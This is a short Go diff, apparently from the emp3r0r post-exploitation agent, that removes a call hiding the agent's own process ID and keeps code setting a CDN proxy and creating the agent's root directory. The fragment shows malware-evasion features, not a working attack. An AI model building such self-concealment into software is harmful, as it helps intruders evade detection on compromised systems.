@@ -187,12 +187,6 @@ func main() {
 		emp3r0r_data.AgentProxy = cdnproxyAddr
 	}
 
-	// hide process of itself if possible
-	err = agent.UpdateHIDE_PIDS()
-	if err != nil {
-		log.Print(err)
-	}
-
 	// agent root
 	if !util.IsFileExist(emp3r0r_data.AgentRoot) {
 		err = os.MkdirAll(emp3r0r_data.AgentRoot, 0700)
